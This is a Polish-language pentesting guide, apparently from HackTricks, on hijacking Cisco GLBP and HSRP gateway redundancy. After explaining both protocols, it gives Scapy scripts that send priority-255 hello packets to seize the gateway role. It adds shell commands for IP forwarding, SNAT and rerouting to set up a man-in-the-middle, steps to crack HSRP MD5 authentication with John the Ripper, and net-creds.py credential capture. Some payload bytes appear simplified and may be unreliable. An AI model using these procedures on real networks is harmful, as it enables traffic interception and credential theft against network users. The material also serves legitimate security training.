# GLBP & HSRP Ataki

{{#include ../../banners/hacktricks-training.md}}


## FHRP Hijacking Overview

### Insights into FHRP

FHRP został zaprojektowany, aby zapewnić odporność sieci przez połączenie wielu routerów w jedną wirtualną jednostkę, zwiększając tym samym rozkład obciążenia i tolerancję na błędy. Cisco Systems wprowadził w tej rodzinie protokołów m.in. GLBP i HSRP.

### GLBP Protocol Insights

GLBP, opracowany przez Cisco, działa na stosie TCP/IP i wykorzystuje UDP na porcie 3222 do komunikacji. Routery w grupie GLBP wymieniają pakiety "hello" co 3 sekundy. Jeśli router nie wyśle tych pakietów przez 10 sekund, zakłada się, że jest offline. Jednak te timery nie są stałe i można je zmodyfikować.

GLBP dla IPv6 używa multicastu **FF02::66** przez UDP/3222, a format wirtualnego MAC to `0007.b4xx.xxyy` (ID AVF znajduje się w ostatnim bajcie). Czasowania i powierzchnia ataku pozostają takie same jak w IPv4, więc techniki przejęcia nadal działają w sieciach dual‑stack.

### GLBP Operations and Load Distribution

GLBP wyróżnia się możliwością rozkładania obciążenia pomiędzy routery przy użyciu pojedynczego wirtualnego IP razem z wieloma wirtualnymi adresami MAC. W grupie GLBP każdy router bierze udział w przekazywaniu pakietów. W przeciwieństwie do HSRP/VRRP, GLBP oferuje prawdziwe load balancing poprzez kilka mechanizmów:

- **Host-Dependent Load Balancing:** Utrzymuje stałe przypisanie MAC AVF do hosta, co jest istotne dla stabilnych konfiguracji NAT.
- **Round-Robin Load Balancing:** Domyślne podejście, naprzemiennie przypisujące MAC AVF pomiędzy żądającymi hostami.
- **Weighted Round-Robin Load Balancing:** Rozdziela obciążenie na podstawie zdefiniowanych metryk "Weight".

### Key Components and Terminologies in GLBP

- **AVG (Active Virtual Gateway):** Główny router, odpowiedzialny za przydzielanie adresów MAC pozostałym routerom.
- **AVF (Active Virtual Forwarder):** Router wyznaczony do obsługi ruchu sieciowego.
- **GLBP Priority:** Metryka określająca AVG, domyślnie ustawiona na 100, w zakresie od 1 do 255.
- **GLBP Weight:** Odzwierciedla aktualne obciążenie routera, możliwa do regulacji ręcznie lub przez Object Tracking.
- **GLBP Virtual IP Address:** Służy jako domyślna brama sieciowa dla wszystkich podłączonych urządzeń.

Do komunikacji GLBP używa zarezerwowanego adresu multicast 224.0.0.102 i portu UDP 3222. Routery wysyłają pakiety "hello" co 3 sekundy i są uznawane za nieoperacyjne, jeśli pakiet nie nadejdzie przez 10 sekund.

### GLBP Attack Mechanism

Atakujący może zostać routerem głównym, wysyłając pakiet GLBP z najwyższą wartością priority (255). Może to prowadzić do DoS lub MITM, umożliwiając przechwycenie lub przekierowanie ruchu.

**Praktyczne przejęcie GLBP przy użyciu Scapy (krótki PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Skomponuj bajty payloadu, aby naśladować nagłówek GLBP (version/opcode/priority/weight/VRID). Zapętlenie ramki zapewnia wygraną w wyborach AVG, jeśli authentication jest nieobecne.

### Wykonanie ataku GLBP za pomocą Loki

[Loki](https://github.com/raizo62/loki_on_kali) może przeprowadzić atak GLBP przez wstrzyknięcie pakietu z priority i weight ustawionymi na 255. Kroki przygotowawcze obejmują zebranie informacji, takich jak virtual IP address, obecność authentication oraz wartości priority routerów, używając narzędzi takich jak Wireshark.

Kroki ataku:

1. Przełącz interfejs w promiscuous mode i włącz IP forwarding.
2. Zidentyfikuj docelowy router i pobierz jego IP.
3. Wygeneruj Gratuitous ARP.
4. Wstrzyknij złośliwy pakiet GLBP, podszywając się pod AVG.
5. Przypisz drugorzędny adres IP do interfejsu sieciowego atakującego, odzwierciedlając GLBP virtual IP.
6. Zaimplementuj SNAT, aby uzyskać pełną widoczność ruchu.
7. Dostosuj routing, aby zapewnić ciągły dostęp do internetu przez oryginalny router AVG.

Postępując zgodnie z tymi krokami, atakujący ustawia się jako "man in the middle", zdolny do przechwytywania i analizowania ruchu sieciowego, w tym danych niezaszyfrowanych lub wrażliwych.

Dla demonstracji, oto wymagane fragmenty poleceń:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitorowanie i przechwytywanie ruchu można wykonać za pomocą net-creds.py lub podobnych narzędzi, aby przechwycić i analizować dane przepływające przez skompromitowaną sieć.

### Pasywne wyjaśnienie HSRP Hijacking ze szczegółami poleceń

#### Przegląd HSRP (Hot Standby Router/Redundancy Protocol)

HSRP jest zastrzeżonym przez Cisco protokołem zaprojektowanym dla redundancji bramy sieciowej. Pozwala na skonfigurowanie wielu fizycznych routerów jako jednego logicznego bytu z współdzielonym adresem IP. Jednostką logiczną zarządza router primary odpowiedzialny za kierowanie ruchem. W odróżnieniu od GLBP, które używa metryk takich jak priority i weight do load balancing, HSRP opiera się na jednym aktywnym routerze do zarządzania ruchem.

HSRPv1 używa multicast **224.0.0.2** oraz wirtualnego MAC `0000.0c07.acXX`; HSRPv2 i HSRPv2 dla IPv6 używają **224.0.0.102 / FF02::66** oraz wirtualnego MAC `0000.0c9f.fXXX`. Port docelowy UDP to **1985** dla IPv4 i **2029** dla IPv6.

#### Roles and Terminology in HSRP

- **HSRP Active Router**: Urządzenie pełniące funkcję bramy, zarządzające przepływem ruchu.
- **HSRP Standby Router**: Router zapasowy, gotowy przejąć rolę, jeśli aktywny router zawiedzie.
- **HSRP Group**: Zestaw routerów współpracujących w celu utworzenia jednego odpornego, wirtualnego routera.
- **HSRP MAC Address**: Wirtualny adres MAC przypisany logicznemu routerowi w konfiguracji HSRP.
- **HSRP Virtual IP Address**: Wirtualny adres IP grupy HSRP, pełniący rolę domyślnej bramy dla podłączonych urządzeń.

#### HSRP Versions

HSRP występuje w dwóch wersjach, HSRPv1 i HSRPv2, różniących się głównie pojemnością grupy, użyciem multicast IP oraz strukturą wirtualnego adresu MAC. Protokół wykorzystuje określone adresy multicast do wymiany informacji serwisowych, a pakiety Hello są wysyłane co 3 sekundy. Router jest uznawany za nieaktywny, jeśli nie otrzymano żadnego pakietu w ciągu 10-sekundowego interwału.

#### HSRP Attack Mechanism

Ataki HSRP polegają na wymuszeniu przejęcia roli Active Router poprzez wstrzyknięcie maksymalnej wartości priority. Może to doprowadzić do Man-In-The-Middle (MITM) attack. Niezbędne kroki wstępne obejmują zebranie danych o konfiguracji HSRP, co można zrobić przy pomocy Wireshark do analizy ruchu.

**Quick HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Jeśli uwierzytelnianie **nie** jest skonfigurowane, ciągłe wysyłanie hellos z wyższym priorytetem wymusza na peerach przejście do stanów *Speak*/*Listen* i pozwala ci zostać *Active*, przekierowując ruch przez twój host.

**Nietypowe przypadki uwierzytelniania HSRP**

- Stare uwierzytelnianie w postaci plain-text jest trywialnie podszywalne.
- Uwierzytelnianie MD5 chroni tylko payload HSRP; spreparowane pakiety nadal mogą ograniczać/wywoływać DoS na płaszczyznach kontrolnych. W wydaniach NX-OS wcześniej dopuszczano DoS przeciw grupom z uwierzytelnianiem (zob. Cisco advisory CSCup11309).
- Na wielu współdzielonych VLANach ISP/VPS multicasty HSRPv1 są widoczne dla tenantów; bez uwierzytelniania możesz dołączyć i przejąć ruch.

#### Kroki do obejścia uwierzytelniania HSRP

1. Zapisz ruch sieciowy zawierający dane HSRP do pliku .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Wyodrębnij hashe MD5 z pliku .pcap za pomocą hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Złam hashe MD5 przy użyciu John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Wykonywanie injekcji HSRP za pomocą Loki**

1. Uruchom Loki, by wykryć ogłoszenia HSRP.
2. Ustaw interfejs sieciowy w tryb promiscuous i włącz przekazywanie IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Użyj Loki, aby zaatakować konkretny router, wprowadź złamane hasło HSRP i wykonaj niezbędne konfiguracje, by podszyć się pod *Active Router*.
4. Po przejęciu roli *Active Router*, skonfiguruj swój interfejs sieciowy i reguły iptables, aby przechwycić rzeczywisty ruch.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Zmień tablicę routingu, aby skierować ruch przez byłego *Active Router*.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Użyj net-creds.py lub podobnego narzędzia do przechwycenia poświadczeń z przechwyconego ruchu.
```shell
sudo python2 net-creds.py -i eth0
```

Wykonanie tych kroków stawia atakującego w pozycji umożliwiającej przechwytywanie i manipulowanie ruchem, podobnie jak w przypadku przejęcia GLBP. Podkreśla to podatność protokołów redundancji takich jak HSRP oraz potrzebę stosowania solidnych środków bezpieczeństwa.

## Referencje

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
